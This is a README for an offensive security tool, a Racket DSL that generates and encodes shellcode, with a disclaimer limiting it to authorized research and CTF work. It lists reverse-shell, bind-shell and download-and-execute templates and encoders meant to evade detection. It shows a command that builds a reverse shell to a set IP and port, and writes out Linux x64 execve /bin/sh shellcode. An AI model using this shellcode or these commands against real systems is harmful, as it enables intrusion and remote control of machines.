# nullsec-shellcraft

```
    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
      ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░   ░  ░  ░     ░   ░        
            ░                          ░    ░           ░        
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   █░░░░░░░░░░░░░░ S H E L L C R A F T ░░░░░░░░░░░░░░░░░░░░░░█
   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
                       bad-antics
```

![Racket](https://img.shields.io/badge/Racket-9F1D20?style=for-the-badge&logo=racket&logoColor=white)

## Overview

**nullsec-shellcraft** is a shellcode generation and analysis DSL written in Racket. Uses Scheme's macro system for powerful shellcode composition, transformation, and verification.

## Features

- 🔧 **Shellcode DSL** - Domain-specific language for shellcode
- 🧬 **Transformations** - XOR, polymorphic, metamorphic encoding
- 🔍 **Analysis** - Bad character detection, size optimization
- 📦 **Templates** - Pre-built shellcode for common tasks
- 🔄 **Composition** - Combine shellcode components
- ✅ **Verification** - Static analysis for common issues

## Requirements

- Racket 8.0+

## Installation

```bash
git clone https://github.com/bad-antics/nullsec-shellcraft.git
cd nullsec-shellcraft
raco pkg install
```

## Usage

```bash
# Generate execve shellcode
racket shellcraft.rkt generate --type execve --arch x64

# Encode shellcode
racket shellcraft.rkt encode --input shell.bin --method xor --key 0x41

# Analyze for bad characters
racket shellcraft.rkt analyze --input shell.bin --badchars "\\x00\\x0a\\x0d"

# Create reverse shell
racket shellcraft.rkt reverse --host 192.168.1.100 --port 4444

# Compose shellcode
racket shellcraft.rkt compose --stager loader.bin --payload shell.bin
```

## DSL Example

```racket
#lang nullsec/shellcraft

(define-shellcode linux-x64-execve
  (section text
    (xor rsi rsi)
    (push rsi)
    (mov rdi "/bin//sh")
    (push rdi)
    (push rsp)
    (pop rdi)
    (xor rdx rdx)
    (mov al 59)
    (syscall)))

(encode linux-x64-execve #:method 'xor #:key #x41)
```

## Templates

| Template | Description |
|----------|-------------|
| `execve` | Execute /bin/sh |
| `reverse` | Reverse TCP shell |
| `bind` | Bind TCP shell |
| `download-exec` | Download and execute |
| `staged` | Staged payload loader |
| `egghunter` | Egg hunter stub |

## Encoders

- **XOR** - Single-byte XOR encoding
- **XOR-ADD** - XOR with key rotation
- **SUB** - Subtraction encoder
- **Polymorphic** - Random NOP/equivalent instruction insertion
- **Metamorphic** - Instruction substitution

## Disclaimer

For authorized security research and CTF only. Creating malicious shellcode is illegal.

## License

NullSec Proprietary License

## Author

**bad-antics** - NullSec Security Team

---

*Part of the NullSec Security Toolkit*

---

[![GitHub](https://img.shields.io/badge/GitHub-bad--antics-181717?style=flat&logo=github&logoColor=white)](https://github.com/bad-antics)
[![Discord](https://img.shields.io/badge/Discord-killers-5865F2?style=flat&logo=discord&logoColor=white)](https://discord.gg/killers)
